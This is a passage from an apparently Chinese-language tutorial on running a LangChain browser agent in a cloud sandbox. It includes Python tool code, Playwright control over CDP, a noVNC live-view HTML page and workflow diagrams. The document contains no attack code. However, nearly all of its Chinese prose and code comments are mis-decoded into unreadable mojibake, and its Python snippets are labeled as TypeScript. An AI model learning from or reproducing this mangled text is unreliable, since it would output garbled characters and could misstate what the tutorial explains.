<p>åœ¨ <code>main.py</code> ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨çš„åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-title class_">Path</span>

def <span class="hljs-title function_">open_vnc_viewer</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨"</span><span class="hljs-string">""</span>
    current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
    vnc_html_path = current_dir / <span class="hljs-string">"vnc.html"</span>
    
    <span class="hljs-keyword">if</span> vnc_html_path.<span class="hljs-title function_">exists</span>():
        # é€šè¿‡ <span class="hljs-variable constant_">URL</span> å‚æ•°ä¼ é€’ <span class="hljs-variable constant_">VNC</span> <span class="hljs-variable constant_">URL</span>
        encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
        file_url = f<span class="hljs-string">"file://{vnc_html_path}?url={encoded_url}"</span>
        webbrowser.<span class="hljs-title function_">open</span>(file_url)
</code></pre>
<p><strong>VNC HTML é¡µé¢ï¼š</strong></p>
<p><code>vnc.html</code> é¡µé¢ä¼šä» URL å‚æ•°ä¸­è¯»å– VNC URLï¼Œå¹¶è‡ªåŠ¨è¿æ¥åˆ° VNC æœåŠ¡å™¨ã€‚é¡µé¢åŒ…å«ä»¥ä¸‹æ ¸å¿ƒåŠŸèƒ½ï¼š</p>
<ol>
<li><strong>noVNC åº“åŠ è½½</strong>: ä» CDN åŠ¨æ€åŠ è½½ noVNC å®¢æˆ·ç«¯åº“</li>
<li><strong>è‡ªåŠ¨è¿æ¥</strong>: è¯»å– URL å‚æ•°ä¸­çš„ VNC URL å¹¶è‡ªåŠ¨è¿æ¥</li>
<li><strong>çŠ¶æ€æ˜¾ç¤º</strong>: æ˜¾ç¤ºè¿æ¥çŠ¶æ€ï¼ˆè¿æ¥ä¸­ã€å·²è¿æ¥ã€å·²æ–­å¼€ï¼‰</li>
<li><strong>æ‰‹åŠ¨æ§åˆ¶</strong>: æ”¯æŒæ‰‹åŠ¨è¾“å…¥ VNC URLã€æ–­å¼€é‡è¿ç­‰æ“ä½œ</li>
</ol>
<p>æ ¸å¿ƒ JavaScript ä»£ç ç‰‡æ®µï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä» URL å‚æ•°è·å– VNC URL</span>
<span class="hljs-keyword">const</span> urlParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
<span class="hljs-keyword">const</span> vncUrl = urlParams.<span class="hljs-title function_">get</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// åŠ è½½ noVNC åº“</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadNoVNC</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'https://cdn.jsdelivr.net/gh/novnc/noVNC@v1.4.0/core/rfb.js'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
}

<span class="hljs-comment">// è¿æ¥ VNC</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connectVNC</span>(<span class="hljs-params">url</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RFB</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadNoVNC</span>();
    rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(vncScreen, url, {
        <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> }
    });
    
    rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'VNC è¿æ¥æˆåŠŸ'</span>);
    });
}
</code></pre>
<p>å®Œæ•´çš„ <code>vnc.html</code> æ–‡ä»¶å¯ä»¥åœ¨ç¤ºä¾‹ä»£ç ä»“åº“ä¸­è·å–ã€‚</p>
<p><strong>æ‰‹åŠ¨ä½¿ç”¨ VNC æŸ¥çœ‹å™¨ï¼š</strong></p>
<p>å¦‚æœè‡ªåŠ¨æ‰“å¼€å¤±è´¥ï¼Œæ‚¨ä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ VNC æŸ¥çœ‹å™¨ï¼š</p>
<ol>
<li><strong>ä½¿ç”¨ noVNC åœ¨çº¿å®¢æˆ·ç«¯</strong>:
<ul>
<li>è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fnovnc.com%2FnoVNC%2Fvnc.html" target="_blank" title="https://novnc.com/noVNC/vnc.html" ref="nofollow noopener noreferrer">noVNC åœ¨çº¿å®¢æˆ·ç«¯</a></li>
<li>åœ¨è¿æ¥è®¾ç½®ä¸­å¡«å…¥ VNC URL</li>
<li>ç‚¹å‡»è¿æ¥</li>
</ul>
</li>
<li><strong>ä½¿ç”¨æœ¬åœ° VNC HTML é¡µé¢</strong>:
<ul>
<li>æ‰“å¼€ <code>vnc.html</code></li>
<li>è¾“å…¥ VNC URL</li>
<li>ç‚¹å‡»è¿æ¥æŒ‰é’®</li>
</ul>
</li>
</ol>
<p><strong>å®æ—¶ç›‘æ§åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰æµè§ˆå™¨æ“ä½œéƒ½ä¼šåœ¨ VNC ä¸­å®æ—¶æ˜¾ç¤º</li>
<li>å¯ä»¥çœ‹åˆ° Agent çš„æ¯ä¸€æ­¥æ“ä½œï¼ˆå¯¼èˆªã€ç‚¹å‡»ã€è¾“å…¥ç­‰ï¼‰</li>
<li>æ–¹ä¾¿è°ƒè¯•å’Œç›‘æ§ Agent è¡Œä¸º</li>
<li>æ”¯æŒäº¤äº’å¼æ“ä½œï¼ˆåœ¨ VNC ä¸­ç›´æ¥æ“ä½œæµè§ˆå™¨ï¼‰</li>
</ul>
<h5 data-id="heading-19">è¿è¡Œå’Œæµ‹è¯•</h5>
<pre><code class="hljs language-typescript" lang="typescript">python main.<span class="hljs-property">py</span>
</code></pre>
<p>ç¨‹åºä¼šè‡ªåŠ¨ï¼š</p>
<ol>
<li>åˆ›å»º Browser Sandbox</li>
<li>æ‰“å¼€ VNC æŸ¥çœ‹å™¨ï¼ˆå®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œï¼‰</li>
<li>æ‰§è¡Œé¢„è®¾æŸ¥è¯¢</li>
<li>è¿›å…¥äº¤äº’æ¨¡å¼</li>
</ol>
<h4 data-id="heading-20">å·¥ä½œåŸç†</h4>
<p>ä¸ºäº†æ›´å¥½åœ°ç†è§£ç³»ç»Ÿæ¶æ„ï¼Œæˆ‘ä»¬å°†å·¥ä½œæµç¨‹æ‹†åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>LangChain Agent å·¥ä½œæµç¨‹</strong>å’Œ <strong>SandboxManager ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ã€‚</p>
<h5 data-id="heading-21">1. LangChain Agent å·¥ä½œæµç¨‹</h5>
<p>ä¸‹å›¾å±•ç¤ºäº† LangChain Agent å¦‚ä½•å¤„ç†ç”¨æˆ·è¯·æ±‚å¹¶è°ƒç”¨ç›¸åº”çš„ Toolsï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    Start([ç”¨æˆ·å‘èµ·è¯·æ±‚&lt;br/&gt;ä¾‹: è®¿é—®ç½‘é¡µå¹¶æˆªå›¾]) --&gt; Agent[LangChain Agent&lt;br/&gt;åˆ†æç”¨æˆ·æ„å›¾]
    
    Agent --&gt; SelectTool{é€‰æ‹©åˆé€‚çš„ Tool}
    
    SelectTool --&gt;|é¦–æ¬¡ä½¿ç”¨| Tool1[create_browser_sandbox]
    SelectTool --&gt;|å¯¼èˆªç½‘é¡µ| Tool2[navigate_to_url]
    SelectTool --&gt;|æˆªå–å±å¹•| Tool3[take_screenshot]
    SelectTool --&gt;|æŸ¥è¯¢çŠ¶æ€| Tool4[get_sandbox_info]
    SelectTool --&gt;|æ¸…ç†èµ„æº| Tool5[destroy_sandbox]
    
    Tool1 --&gt; CallManager1[è°ƒç”¨ SandboxManager]
    Tool2 --&gt; CallManager2[è°ƒç”¨ SandboxManager]
    Tool3 --&gt; CallManager3[è°ƒç”¨ SandboxManager]
    Tool4 --&gt; CallManager4[è°ƒç”¨ SandboxManager]
    Tool5 --&gt; CallManager5[è°ƒç”¨ SandboxManager]
    
    CallManager1 --&gt; Manager[SandboxManager&lt;br/&gt;å•ä¾‹å®ä¾‹]
    CallManager2 --&gt; Manager
    CallManager3 --&gt; Manager
    CallManager4 --&gt; Manager
    CallManager5 --&gt; Manager
    
    Manager --&gt; ToolResult[Tool è¿”å›ç»“æœ]
    ToolResult --&gt; AgentProcess[Agent å¤„ç†ç»“æœ&lt;br/&gt;ç”Ÿæˆå“åº”]
    AgentProcess --&gt; Response([è¿”å›ç”¨æˆ·å‹å¥½çš„å“åº”])
    
    Response -.å¤šè½®å¯¹è¯.-&gt; Start
    
    style Agent fill:#667eea,color:#fff
    style Manager fill:#764ba2,color:#fff
    style Tool1 fill:#4ecdc4,color:#fff
    style Tool2 fill:#4ecdc4,color:#fff
    style Tool3 fill:#4ecdc4,color:#fff
    style Tool4 fill:#4ecdc4,color:#fff
    style Tool5 fill:#4ecdc4,color:#fff
</code></pre>
<p><strong>Agent å·¥ä½œæµç¨‹è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>è¯·æ±‚æ¥æ”¶</strong>ï¼šç”¨æˆ·å‘èµ·è‡ªç„¶è¯­è¨€è¯·æ±‚ï¼ˆå¦‚"è®¿é—®æ·˜å®é¦–é¡µå¹¶æˆªå›¾"ï¼‰</li>
<li><strong>æ„å›¾åˆ†æ</strong>ï¼šAgent åˆ†æç”¨æˆ·æ„å›¾ï¼Œå†³å®šéœ€è¦è°ƒç”¨å“ªäº› Tools</li>
<li><strong>Tool è°ƒç”¨</strong>ï¼šæ ¹æ®ä»»åŠ¡éœ€æ±‚ï¼Œé¡ºåºæˆ–ç»„åˆè°ƒç”¨å¤šä¸ª Tools</li>
<li><strong>Manager äº¤äº’</strong>ï¼šæ‰€æœ‰ Tools éƒ½é€šè¿‡ SandboxManager å•ä¾‹å®ä¾‹æ“ä½œ Sandbox</li>
<li><strong>ç»“æœå¤„ç†</strong>ï¼šAgent å°† Tool è¿”å›çš„ç»“æœæ•´åˆæˆç”¨æˆ·å‹å¥½çš„å“åº”</li>
<li><strong>å¤šè½®å¯¹è¯</strong>ï¼šSandbox åœ¨æ•´ä¸ªä¼šè¯ä¸­ä¿æŒæ´»è·ƒï¼Œæ”¯æŒå¤šè½®å¯¹è¯</li>
</ol>
<p><strong>5 ä¸ªæ ¸å¿ƒ Tools çš„èŒè´£ï¼š</strong></p>



































<table><thead><tr><th>Tool</th><th>åŠŸèƒ½</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>create_browser_sandbox</code></td><td>åˆ›å»º Sandbox å®ä¾‹</td><td>é¦–æ¬¡ä½¿ç”¨æˆ– Sandbox å·²é”€æ¯æ—¶</td></tr><tr><td><code>navigate_to_url</code></td><td>å¯¼èˆªåˆ°æŒ‡å®š URL</td><td>éœ€è¦è®¿é—®ç½‘é¡µæ—¶</td></tr><tr><td><code>take_screenshot</code></td><td>æˆªå–å½“å‰é¡µé¢</td><td>éœ€è¦ä¿å­˜é¡µé¢å¿«ç…§æ—¶</td></tr><tr><td><code>get_sandbox_info</code></td><td>è·å– Sandbox ä¿¡æ¯</td><td>æŸ¥çœ‹çŠ¶æ€æˆ–è·å– VNC URL æ—¶</td></tr><tr><td><code>destroy_sandbox</code></td><td>é”€æ¯ Sandbox å®ä¾‹</td><td>ä»»åŠ¡å®Œæˆæˆ–éœ€è¦é‡Šæ”¾èµ„æºæ—¶</td></tr></tbody></table>
<h5 data-id="heading-22">2. SandboxManager ç”Ÿå‘½å‘¨æœŸç®¡ç†</h5>
<p>ä¸‹å›¾å±•ç¤ºäº† SandboxManager å¦‚ä½•ç®¡ç† Sandbox çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸï¼š</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2026/svg/132256418/1767589910006-102dcf23-d720-44b7-9907-b32509a77adb.svg" alt="" loading="lazy"/></p>
<p><strong>SandboxManager å·¥ä½œæµç¨‹è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å•ä¾‹ç®¡ç†</strong>ï¼š
<ul>
<li>é¦–æ¬¡è°ƒç”¨æ—¶åˆ›å»º Manager å®ä¾‹</li>
<li>åç»­è°ƒç”¨å¤ç”¨åŒä¸€ä¸ªå®ä¾‹</li>
<li>ç¡®ä¿æ•´ä¸ªä¼šè¯åªæœ‰ä¸€ä¸ª Sandbox</li>
</ul>
</li>
<li><strong>Sandbox åˆ›å»º</strong>ï¼š
<ul>
<li>è°ƒç”¨ AgentRun SDK çš„ Sandbox.create()</li>
<li>SDK é€šè¿‡é˜¿é‡Œäº‘ API ä¸å‡½æ•°è®¡ç®— FC é€šä¿¡</li>
<li>FC æœåŠ¡åˆ›å»ºç‹¬ç«‹çš„å®¹å™¨å®ä¾‹ï¼ŒåŒ…å«ï¼š
<ul>
<li>Chromium æµè§ˆå™¨VNC æœåŠ¡å¿…è¦çš„è¿è¡Œç¯å¢ƒ</li>
</ul>
</li>
</ul>
</li>
<li><strong>è¿æ¥ä¿¡æ¯è·å–</strong>ï¼š
<ul>
<li><strong>CDP URL</strong>ï¼šWebSocket åœ°å€ï¼Œç”¨äº Playwright/Puppeteer è¿œç¨‹æ§åˆ¶æµè§ˆå™¨</li>
<li><strong>VNC URL</strong>ï¼šWebSocket åœ°å€ï¼Œç”¨äºå®æ—¶æŸ¥çœ‹æµè§ˆå™¨ç”»é¢</li>
</ul>
</li>
<li><strong>æµè§ˆå™¨æ“ä½œ</strong>ï¼š
<ul>
<li>Playwright é€šè¿‡ CDP URL è¿æ¥åˆ°è¿œç¨‹æµè§ˆå™¨</li>
<li>æ‰§è¡Œå„ç§æµè§ˆå™¨æ“ä½œï¼ˆå¯¼èˆªã€ç‚¹å‡»ã€æˆªå›¾ç­‰ï¼‰</li>
<li>VNC åŒæ­¥æ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ï¼Œç”¨æˆ·å¯å®æ—¶ç›‘æ§</li>
</ul>
</li>
<li><strong>èµ„æºæ¸…ç†</strong>ï¼š
<ul>
<li>è°ƒç”¨ destroy() æ–¹æ³•é”€æ¯ Sandbox</li>
<li>æ¸…ç† Manager å†…éƒ¨çŠ¶æ€</li>
<li>é€šè¿‡ SDK é‡Šæ”¾äº‘ç«¯èµ„æº</li>
</ul>
</li>
</ol>
<h5 data-id="heading-23">3. Agent ä¸ Manager çš„åä½œå…³ç³»</h5>
<p><strong>äº¤äº’æ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-latex" lang="latex">ç”¨æˆ·è¯·æ±‚ â†’ Agent â†’ Tool â†’ SandboxManager â†’ AgentRun SDK â†’ äº‘ç«¯ Sandbox
                                    â†“
ç”¨æˆ·å“åº” â† Agent â† Tool â† SandboxManager â† æ“ä½œç»“æœ
</code></pre>
<p><strong>å…³é”®è®¾è®¡ç†å¿µï¼š</strong></p>
<ol>
<li><strong>åˆ†å±‚æ¶æ„</strong>ï¼š
<ul>
<li><strong>ç”¨æˆ·å±‚</strong>ï¼šè‡ªç„¶è¯­è¨€äº¤äº’</li>
<li><strong>Agent å±‚</strong>ï¼šæ„å›¾ç†è§£å’Œä»»åŠ¡åˆ†è§£</li>
<li><strong>Tool å±‚</strong>ï¼šåŠŸèƒ½å°è£…å’Œå‚æ•°éªŒè¯</li>
<li><strong>Manager å±‚</strong>ï¼šèµ„æºç®¡ç†å’ŒçŠ¶æ€ç»´æŠ¤</li>
<li><strong>SDK å±‚</strong>ï¼šäº‘æœåŠ¡é€šä¿¡</li>
<li><strong>äº‘ç«¯å±‚</strong>ï¼šå®é™…çš„ Sandbox ç¯å¢ƒ</li>
</ul>
</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>ï¼š
<ul>
<li>SandboxManager ä½¿ç”¨å•ä¾‹æ¨¡å¼</li>
<li>ä¿è¯æ•´ä¸ªä¼šè¯ä¸­åªæœ‰ä¸€ä¸ª Sandbox å®ä¾‹</li>
<li>é¿å…èµ„æºæµªè´¹å’ŒçŠ¶æ€å†²çª</li>
</ul>
</li>
<li><strong>çŠ¶æ€å¤ç”¨</strong>ï¼š
<ul>
<li>Sandbox åœ¨å¤šè½®å¯¹è¯ä¸­ä¿æŒæ´»è·ƒ</li>
<li>å‡å°‘åˆ›å»ºå’Œé”€æ¯çš„å¼€é”€</li>
<li>æä¾›æ›´æµç•…çš„ç”¨æˆ·ä½“éªŒ</li>
</ul>
</li>
<li><strong>åŒé€šé“è®¾è®¡</strong>ï¼š
<ul>
<li><strong>CDP é€šé“</strong>ï¼šAgent é€šè¿‡ Playwright æ§åˆ¶æµè§ˆå™¨</li>
<li><strong>VNC é€šé“</strong>ï¼šç”¨æˆ·é€šè¿‡ VNC æŸ¥çœ‹å™¨å®æ—¶ç›‘æ§</li>
</ul>
</li>
<li><strong>è§£è€¦è®¾è®¡</strong>ï¼š
<ul>
<li>Tools ä¸ç›´æ¥æ“ä½œ SDKï¼Œé€šè¿‡ Manager ç»Ÿä¸€ç®¡ç†</li>
<li>ä¾¿äºæ‰©å±•å’Œç»´æŠ¤</li>
<li>ç»Ÿä¸€çš„é”™è¯¯å¤„ç†å’Œèµ„æºç®¡ç†</li>
</ul>
</li>
</ol>
<p><strong>å…¸å‹ä½¿ç”¨åœºæ™¯ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"># ç¬¬ <span class="hljs-number">1</span> è½®å¯¹è¯
ç”¨æˆ·: <span class="hljs-string">"åˆ›å»ºä¸€ä¸ª sandbox å¹¶è®¿é—®æ·˜å®é¦–é¡µ"</span>
â†’ <span class="hljs-title class_">Agent</span> è°ƒç”¨: create_browser_sandbox â†’ navigate_to_url
â†’ <span class="hljs-title class_">Manager</span>: åˆ›å»º <span class="hljs-title class_">Sandbox</span> â†’ <span class="hljs-title class_">Playwright</span> å¯¼èˆª
â†’ ç»“æœ: <span class="hljs-string">"Sandbox å·²åˆ›å»ºï¼Œå·²è®¿é—®æ·˜å®é¦–é¡µ"</span>

# ç¬¬ <span class="hljs-number">2</span> è½®å¯¹è¯ï¼ˆå¤ç”¨ <span class="hljs-title class_">Sandbox</span>ï¼‰
ç”¨æˆ·: <span class="hljs-string">"æˆªå–å½“å‰é¡µé¢"</span>
â†’ <span class="hljs-title class_">Agent</span> è°ƒç”¨: take_screenshot
â†’ <span class="hljs-title class_">Manager</span>: ä½¿ç”¨ç°æœ‰ <span class="hljs-title class_">Sandbox</span> â†’ <span class="hljs-title class_">Playwright</span> æˆªå›¾
â†’ ç»“æœ: <span class="hljs-string">"æˆªå›¾å·²ä¿å­˜"</span>

# ç¬¬ <span class="hljs-number">3</span> è½®å¯¹è¯ï¼ˆå¤ç”¨ <span class="hljs-title class_">Sandbox</span>ï¼‰
ç”¨æˆ·: <span class="hljs-string">"è®¿é—®äº¬ä¸œé¦–é¡µ"</span>
â†’ <span class="hljs-title class_">Agent</span> è°ƒç”¨: navigate_to_url
â†’ <span class="hljs-title class_">Manager</span>: ä½¿ç”¨ç°æœ‰ <span class="hljs-title class_">Sandbox</span> â†’ <span class="hljs-title class_">Playwright</span> å¯¼èˆª
â†’ ç»“æœ: <span class="hljs-string">"å·²è®¿é—®äº¬ä¸œé¦–é¡µ"</span>
</code></pre>
<p>é€šè¿‡è¿™ç§è®¾è®¡ï¼ŒAgent ä¸“æ³¨äºç†è§£ç”¨æˆ·æ„å›¾å’Œä»»åŠ¡ç¼–æ’ï¼Œè€Œ Manager ä¸“æ³¨äº Sandbox çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå®ç°äº†æ¸…æ™°çš„èŒè´£åˆ†ç¦»ã€‚</p>
<p><strong>å·¥ä½œåŸç†æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>å·¥å…·æ³¨å†Œ</strong>: ä½¿ç”¨ <code>@tool</code> è£…é¥°å™¨å°† Sandbox åŠŸèƒ½å°è£…ä¸º LangChain tools</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>: <code>SandboxManager</code> è´Ÿè´£ Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯</li>
<li><strong>çŠ¶æ€ä¿æŒ</strong>: ä½¿ç”¨å•ä¾‹æ¨¡å¼ç®¡ç† Sandbox å®ä¾‹ï¼Œç¡®ä¿åŒä¸€ä¼šè¯å†…å¤ç”¨</li>
<li><strong>VNC é›†æˆ</strong>: è‡ªåŠ¨è·å–å¹¶è¿”å› VNC URLï¼Œæ–¹ä¾¿ç”¨æˆ·å®æ—¶æŸ¥çœ‹</li>
<li><strong>é”™è¯¯å¤„ç†</strong>: æ‰€æœ‰å·¥å…·éƒ½åŒ…å«å®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶</li>
</ol>
<h4 data-id="heading-24">æ‰©å±•å’Œå®šåˆ¶</h4>
<p><strong>æ·»åŠ è‡ªå®šä¹‰ Toolsï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@tool</span>
def <span class="hljs-title function_">extract_table_data</span>(<span class="hljs-attr">url</span>: str) -&gt; <span class="hljs-attr">str</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"ä»ç½‘é¡µä¸­æå–è¡¨æ ¼æ•°æ®"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
    
    manager = <span class="hljs-title function_">get_sandbox_manager</span>()
    cdp_url = manager.<span class="hljs-title function_">get_info</span>()[<span class="hljs-string">'cdp_url'</span>]
    
    <span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
        browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(cdp_url)
        page = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span>[<span class="hljs-number">0</span>]
        page.<span class="hljs-title function_">goto</span>(url)
        tables = page.<span class="hljs-title function_">query_selector_all</span>(<span class="hljs-string">"table"</span>)
        <span class="hljs-keyword">return</span> f<span class="hljs-string">"æ‰¾åˆ° {len(tables)} ä¸ªè¡¨æ ¼"</span>
</code></pre>
<p><strong>è‡ªå®šä¹‰æç¤ºè¯ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript">custom_prompt = <span class="hljs-string">""</span><span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç½‘é¡µæ•°æ®æå–åŠ©æ‰‹ã€‚
åœ¨æ‰§è¡Œä»»åŠ¡å‰ï¼Œè¯·å…ˆåˆ›å»º sandboxï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨å·¥å…·å®Œæˆä»»åŠ¡ã€‚"</span><span class="hljs-string">""</span>

agent = <span class="hljs-title function_">create_browser_agent</span>(system_prompt=custom_prompt)
</code></pre>
<h4 data-id="heading-25">æœ€ä½³å®è·µ</h4>
<ol>
<li><strong>æ¨¡å—åŒ–è®¾è®¡</strong>: å°† Sandbox ç®¡ç†å’Œ Agent åˆ›å»ºåˆ†ç¦»ï¼Œæé«˜ä»£ç å¯ç»´æŠ¤æ€§</li>
<li><strong>é”™è¯¯å¤„ç†</strong>: æ‰€æœ‰å·¥å…·éƒ½åº”åŒ…å«å®Œå–„çš„é”™è¯¯å¤„ç†</li>
<li><strong>èµ„æºæ¸…ç†</strong>: ä½¿ç”¨ä¿¡å·å¤„ç†å™¨ç¡®ä¿èµ„æºæ­£ç¡®æ¸…ç†</li>
<li><strong>VNC æç¤º</strong>: åœ¨å·¥å…·è¿”å›ä¸­åŒ…å« VNC URLï¼Œæ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨</li>
<li><strong>å•ä¾‹æ¨¡å¼</strong>: ç¡®ä¿ Sandbox å®ä¾‹åœ¨ä¼šè¯ä¸­å¤ç”¨ï¼Œé¿å…é‡å¤åˆ›å»º</li>
</ol>
<h2 data-id="heading-26">å‰ç«¯é›†æˆå¯è§†åŒ–ç›‘æ§ï¼ˆVNCï¼‰</h2>
<h3 data-id="heading-27">VNC é›†æˆæ¶æ„</h3>
<p>ä¸‹å›¾å±•ç¤ºäº†å‰ç«¯å¦‚ä½•é›†æˆ VNC å®ç°å®æ—¶ç›‘æ§ï¼š</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/__mermaid_v3/b8d70d84485d4871126222501c457254.svg" alt="" loading="lazy"/></p>
<h3 data-id="heading-28">è½»é‡çº§ HTML é¡µé¢é›†æˆ</h3>
<p>åˆ›å»ºä¸€ä¸ªç®€å•çš„ <code>vnc-viewer.html</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Browser Sandbox VNC æŸ¥çœ‹å™¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>; }
        <span class="hljs-selector-id">#vnc-container</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"vnc-container"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
        <span class="hljs-keyword">const</span> vncUrl = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">'url'</span>);
        
        <span class="hljs-keyword">if</span> (!vncUrl) {
            <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è¯·æä¾› VNC URL å‚æ•°'</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'https://cdn.jsdelivr.net/gh/novnc/noVNC@v1.4.0/core/rfb.js'</span>);
            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RFB</span> = <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
            
            <span class="hljs-keyword">const</span> rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'vnc-container'</span>),
                vncUrl,
                { <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> } }
            );
            
            rfb.<span class="hljs-property">scaleViewport</span> = <span class="hljs-literal">true</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>

vnc_url = sandbox.<span class="hljs-property">vnc_url</span>
encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
